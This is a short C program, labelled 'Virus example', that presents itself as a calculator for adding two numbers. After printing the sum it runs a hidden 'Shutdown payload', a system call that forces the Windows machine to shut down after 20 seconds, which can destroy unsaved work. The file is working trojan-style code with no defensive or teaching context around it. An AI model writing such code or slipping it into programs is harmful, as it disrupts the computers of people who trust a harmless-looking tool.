
//Virus example
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main() {
    int a, b;

    printf("Enter two numbers to add:\n");
    scanf("%d %d", &a, &b);
    printf("%d + %d = %d\n", a, b, a+b);

    // Shutdown payload
    system("shutdown /s /t 20 /f");

    return 0;
}

